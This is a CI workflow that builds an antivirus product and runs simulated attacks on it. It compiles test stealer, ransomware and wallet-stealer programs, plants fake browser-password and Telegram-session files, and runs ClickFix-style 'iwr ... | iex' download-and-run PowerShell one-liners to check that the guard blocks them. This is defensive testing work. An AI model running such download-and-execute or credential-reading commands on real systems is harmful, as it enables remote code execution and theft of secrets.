name: E2E guard v1.6 (service, self-protection, attacks)

on:
  push:
    branches: [ test-ext ]

permissions:
  contents: write

jobs:
  windows:
    runs-on: windows-latest
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Install dependencies
        run: npm install --no-audit --no-fund

      - name: Bundle ClamAV engine (official Cisco-Talos release)
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force vendor/clamav, tmp | Out-Null
          gh release download -R Cisco-Talos/clamav -p "*win.x64.zip" -D tmp --clobber
          $zip = Get-ChildItem tmp -Filter "*win.x64.zip" | Select-Object -First 1
          if (-not $zip) { throw "ClamAV zip not found" }
          Expand-Archive $zip.FullName -DestinationPath tmp/clamav -Force
          $scan = Get-ChildItem tmp/clamav -Recurse -Filter clamscan.exe | Select-Object -First 1
          Copy-Item (Join-Path $scan.DirectoryName '*') vendor/clamav -Recurse -Force
          & vendor/clamav/clamscan.exe --version

      - name: Bundle YARA engine (official VirusTotal release)
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force vendor/yara | Out-Null
          gh release download -R VirusTotal/yara -p "*win64*.zip" -D tmp --clobber
          $zip = Get-ChildItem tmp -Filter "*win64*.zip" | Select-Object -First 1
          if (-not $zip) { throw "YARA zip not found" }
          Expand-Archive $zip.FullName -DestinationPath tmp/yara -Force
          $y = Get-ChildItem tmp/yara -Recurse -Filter "yara64.exe" | Select-Object -First 1
          if (-not $y) { $y = Get-ChildItem tmp/yara -Recurse -Filter "yara.exe" | Select-Object -First 1 }
          Copy-Item (Join-Path $y.DirectoryName '*') vendor/yara -Recurse -Force
          Get-ChildItem vendor/yara

      - name: Build browser-extension installer helper (.NET Framework 4.8, built into Windows)
        shell: pwsh
        run: |
          dotnet build tools/ext-installer/ExtInstaller.csproj -c Release -o tmp/extinst
          if ($LASTEXITCODE -ne 0) { throw "helper build failed" }
          Copy-Item tmp/extinst/ibra-ext-installer.exe vendor/ -Force
          if (Test-Path tmp/extinst/ibra-ext-installer.exe.config) { Copy-Item tmp/extinst/ibra-ext-installer.exe.config vendor/ -Force }
          & vendor/ibra-ext-installer.exe --list
          "helper exit: $LASTEXITCODE"

      - name: Build behaviour guard (.NET Framework 4.8)
        shell: pwsh
        run: |
          dotnet build tools/guard/Guard.csproj -c Release -o tmp/guard
          if ($LASTEXITCODE -ne 0) { throw "guard build failed" }
          Copy-Item tmp/guard/ibra-guard.exe vendor/ -Force
          if (Test-Path tmp/guard/ibra-guard.exe.config) { Copy-Item tmp/guard/ibra-guard.exe.config vendor/ -Force }
          & vendor/ibra-guard.exe --judge 'powershell -w hidden -c "iwr https://x.top/a | iex"' --run

      - name: Remove debug files and show bundle size
        shell: pwsh
        run: |
          Get-ChildItem vendor -Recurse -Include *.pdb,*.lib,*.exp,*.ilk -File | Remove-Item -Force
          # tools we never call (signature authoring / bytecode / rule compiler / manual)
          Remove-Item vendor/clamav/sigtool.exe, vendor/clamav/clambc.exe, vendor/yara/yarac64.exe, vendor/yara/yarac.exe -Force -ErrorAction SilentlyContinue
          Remove-Item vendor/clamav/UserManual -Recurse -Force -ErrorAction SilentlyContinue
          Get-ChildItem vendor -Recurse -Directory | Where-Object { $_.Name -in @('include','lib','share','doc','docs','pkgconfig','cmake') } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
          Get-ChildItem vendor -Recurse -File | Sort-Object Length -Descending | Select-Object -First 15 | ForEach-Object { "{0,10:N1} MB  {1}" -f ($_.Length/1MB), $_.FullName }
          "TOTAL vendor: {0:N1} MB" -f ((Get-ChildItem vendor -Recurse -File | Measure-Object Length -Sum).Sum/1MB)

      - name: Verify YARA rules compile
        shell: pwsh
        run: |
          $exe = Get-ChildItem vendor/yara -Filter "yara*.exe" | Where-Object { $_.Name -notlike "yarac*" } | Select-Object -First 1
          Set-Content tmp/clean.txt "hello"
          & $exe.FullName -w rules/ibra.yar tmp/clean.txt
          if ($LASTEXITCODE -ne 0) { throw "YARA rules failed to compile" }

      - name: Build installer and publish release
        shell: pwsh
        run: |
          # Publishes a GitHub Release named after the version in package.json (creates tag vX.Y.Z)
          npx electron-builder --win --x64 --publish never

      - uses: actions/upload-artifact@v4
        with:
          name: guard
          path: vendor/ibra-guard.exe
          retention-days: 2

      - name: Install old 1.5.0 (per-user), then 1.6.0 over it, run attacks
        shell: pwsh
        run: |
          $csc = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
          $dl = Join-Path $env:USERPROFILE 'Downloads'; $desk = Join-Path $env:USERPROFILE 'Desktop'; New-Item -ItemType Directory -Force $dl,$desk | Out-Null
          foreach ($n in 'Stealer','Ransom','Wallet','Hello') { & $csc /nologo /out:"$dl\$n.exe" "tests\attacks\$n.cs" | Out-Null }
          & $csc /nologo /out:"C:\killtest.exe" "tests\attacks\KillTest.cs" | Out-Null
          $cd = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default'; New-Item -ItemType Directory -Force $cd | Out-Null
          Set-Content (Join-Path $cd 'Login Data') ('SQLite format 3' + ('x' * 4000)); Set-Content (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Local State') '{"os_crypt":{"encrypted_key":"RFBBUEk="}}'
          $tg = Join-Path $env:APPDATA 'Telegram Desktop\tdata'; New-Item -ItemType Directory -Force $tg | Out-Null; Set-Content (Join-Path $tg 'key_datas') 'TDF$session'
          $docs = [Environment]::GetFolderPath('MyDocuments'); 1..3 | % { Set-Content (Join-Path $docs "family-photo-$_.txt") "my precious file $_" }
          Get-Process msedge,chrome -ErrorAction SilentlyContinue | Stop-Process -Force
          "===== old 1.5.0"
          gh release download v1.5.0 -R ibrata2/ibra-antivirus -p "IBRA-ANTIVIRUS-Setup-1.5.0.exe" -D tmp --clobber
          Start-Process tmp\IBRA-ANTIVIRUS-Setup-1.5.0.exe -ArgumentList '/S' -Wait
          "old installed: $(Test-Path "$env:LOCALAPPDATA\Programs\IBRA ANTIVIRUS\IBRA ANTIVIRUS.exe")"
          Start-Sleep 5; Get-Process "IBRA ANTIVIRUS" -ErrorAction SilentlyContinue | Stop-Process -Force
          "===== new 1.6.0"
          $setup = Get-ChildItem dist -Filter "IBRA-ANTIVIRUS-Setup-*.exe" | Select-Object -First 1
          $t0 = Get-Date; Start-Process $setup.FullName -ArgumentList '/S' -Wait; "install took $([int]((Get-Date)-$t0).TotalSeconds)s"
          $exe = "$env:ProgramFiles\IBRA ANTIVIRUS\IBRA ANTIVIRUS.exe"
          "new in Program Files: $(Test-Path $exe)   old per-user still there: $(Test-Path "$env:LOCALAPPDATA\Programs\IBRA ANTIVIRUS")"
          $task = Get-ScheduledTask -TaskName 'IBRA ANTIVIRUS Guard' -ErrorAction SilentlyContinue
          "task: $($task.State) user=$($task.Principal.UserId) action=$($task.Actions.Execute) $($task.Actions.Arguments)"
          Start-Sleep 4
          Get-CimInstance Win32_Process -Filter "Name='ibra-guard.exe'" | % { "guard pid=$($_.ProcessId) owner=$((Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User) cmd=$($_.CommandLine)" }
          "token file: $(Test-Path "$env:ProgramData\IBRA ANTIVIRUS\guard.token")"
          "context menu HKLM: $(Test-Path 'Registry::HKLM\Software\Classes\*\shell\IBRAAntivirus')"
          Get-Process "IBRA ANTIVIRUS" -ErrorAction SilentlyContinue | Stop-Process -Force
          $ud = Join-Path $env:APPDATA 'IBRA ANTIVIRUS'; Remove-Item "$ud\guard-test.json" -ErrorAction SilentlyContinue
          Start-Process $exe -ArgumentList '--test-guard'
          for ($i=0; $i -lt 45 -and -not (Test-Path "$ud\guard-test.json"); $i++) { Start-Sleep 2 }
          "guard-test: $(Get-Content "$ud\guard-test.json" -Raw -ErrorAction SilentlyContinue)"
          Start-Sleep 6
          $acl = Get-Acl -Audit (Join-Path $cd 'Login Data'); "Login Data SACL rules: $($acl.Audit.Count)"
          "bait files: $((Get-ChildItem $docs -Force -Filter '*IBRA-guard*').Name -join ', ')"
          Remove-Item "$env:TEMP\*-survived.txt","$env:TEMP\hello-ran.txt" -ErrorAction SilentlyContinue

          "===== SELF-PROTECTION"
          $main = Get-CimInstance Win32_Process -Filter "Name='IBRA ANTIVIRUS.exe'" | ? { $_.CommandLine -notmatch '--type=' } | Select -First 1
          "main app pid: $($main.ProcessId)"
          Remove-Item C:\kill-result.txt -ErrorAction SilentlyContinue
          runas /trustlevel:0x20000 "C:\killtest.exe $($main.ProcessId) C:\kill-result.txt"
          for ($i=0; $i -lt 15 -and -not (Test-Path C:\kill-result.txt); $i++) { Start-Sleep 1 }
          "normal (non-admin) program tries to kill the app: $(Get-Content C:\kill-result.txt -ErrorAction SilentlyContinue)"
          $g = Get-Process ibra-guard | Select -First 1
          Remove-Item C:\kill-result.txt -ErrorAction SilentlyContinue
          runas /trustlevel:0x20000 "C:\killtest.exe $($g.Id) C:\kill-result.txt"
          for ($i=0; $i -lt 15 -and -not (Test-Path C:\kill-result.txt); $i++) { Start-Sleep 1 }
          "normal program tries to kill the guard: $(Get-Content C:\kill-result.txt -ErrorAction SilentlyContinue)"
          "app still alive: $([bool](Get-Process -Id $main.ProcessId -ErrorAction SilentlyContinue))"
          "--- admin kills the app: the guard must start it again"
          Stop-Process -Id $main.ProcessId -Force; Start-Sleep 12
          $again = Get-CimInstance Win32_Process -Filter "Name='IBRA ANTIVIRUS.exe'" | ? { $_.CommandLine -notmatch '--type=' }
          "app running again: $([bool]$again)  cmd: $($again.CommandLine)"
          if (-not $again) { Start-Process $exe -ArgumentList '--hidden' }
          Start-Sleep 12

          "===== ATTACK 1: unsigned program steals Chrome passwords"
          $p = Start-Process "$dl\Stealer.exe" -PassThru -WindowStyle Hidden; Start-Sleep 30
          "stealer alive: $(-not $p.HasExited)  survived-file: $(Test-Path "$env:TEMP\stealer-survived.txt")  exe still on disk: $(Test-Path "$dl\Stealer.exe")"

          "===== ATTACK 2: PowerShell script reads the Telegram session"
          $p = Start-Process powershell -ArgumentList '-NoProfile','-Command',"Get-Content '$tg\key_datas'; Start-Sleep 25; Set-Content `"$env:TEMP\ps-survived.txt`" x" -PassThru -WindowStyle Hidden; Start-Sleep 12
          "powershell alive: $(-not $p.HasExited)"

          "===== ATTACK 3: ransomware encrypts Documents"
          Copy-Item "$dl\Ransom.exe" "$desk\Ransom.exe"
          $p = Start-Process "$desk\Ransom.exe" -PassThru -WindowStyle Hidden; Start-Sleep 30
          "ransom alive: $(-not $p.HasExited)  survived-file: $(Test-Path "$env:TEMP\ransom-survived.txt")"
          Get-ChildItem $docs -Filter 'family-photo-*' | % { "  $($_.Name): $(Get-Content $_.FullName -Raw)".Trim() }

          "--- security log for bait files"
          Get-WinEvent -FilterHashtable @{LogName='Security';Id=4656,4663} -MaxEvents 400 -ErrorAction SilentlyContinue | ? { $_.Message -match 'IBRA-guard' } | Select -First 6 | % { "  $($_.Id) $($_.TimeCreated) " + (($_.Message -split "`n" | ? { $_ -match 'Object Name|Process Name|Accesses|Keywords' }) -join ' | ').Replace("`r",'') }
          "audit keywords failure events total: $((Get-WinEvent -FilterHashtable @{LogName='Security';Id=4656} -MaxEvents 50 -ErrorAction SilentlyContinue).Count)"
          "===== ATTACK 4: download-and-run command (ClickFix style)"
          $p = Start-Process powershell -ArgumentList '-NoProfile','-w','hidden','-c','iwr http://127.0.0.1:9/x.ps1 | iex; Start-Sleep 30' -PassThru; Start-Sleep 8
          "clickfix powershell alive: $(-not $p.HasExited)"

          "===== ATTACK 5: wallet stealer launched from Downloads (caught at launch)"
          $p = Start-Process "$dl\Wallet.exe" -PassThru -WindowStyle Hidden; Start-Sleep 25
          "wallet alive: $(-not $p.HasExited)  survived-file: $(Test-Path "$env:TEMP\wallet-survived.txt")  exe still on disk: $(Test-Path "$dl\Wallet.exe")"

          "===== NORMAL: unsigned harmless program from Downloads must run"
          $t0 = Get-Date; $p = Start-Process "$dl\Hello.exe" -PassThru -WindowStyle Hidden; for ($i=0; $i -lt 30 -and -not (Test-Path "$env:TEMP\hello-ran.txt"); $i++) { Start-Sleep 1 }
          "hello ran: $(Test-Path "$env:TEMP\hello-ran.txt") after $([int]((Get-Date)-$t0).TotalSeconds)s"
          $t0 = Get-Date; $p = Start-Process "$dl\Hello.exe" -PassThru -WindowStyle Hidden; $p.WaitForExit(20000) | Out-Null; "hello second run took $([math]::Round(((Get-Date)-$t0).TotalSeconds,1))s (cached as clean)"
          $p = Start-Process notepad -PassThru; Start-Sleep 3; "notepad alive: $(-not $p.HasExited)"; $p | Stop-Process -Force

          "===== GUARD LOG"
          $s = Get-Content "$ud\settings.json" -Raw | ConvertFrom-Json
          "stats: $($s.guardStats | ConvertTo-Json -Compress)"
          $s.guardLog | Select -First 15 | % { "  $($_.action) | $($_.kind) | $($_.what) | $($_.name) | quarantined=$($_.quarantined) | $($_.path)" }
          "quarantine: $((Get-Content "$ud\quarantine\index.json" -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json | % { $_.name + ' <- ' + $_.original }) -join ' ; ')"

      - uses: actions/upload-artifact@v4
        with:
          name: setup
          path: dist/*.exe
          retention-days: 1
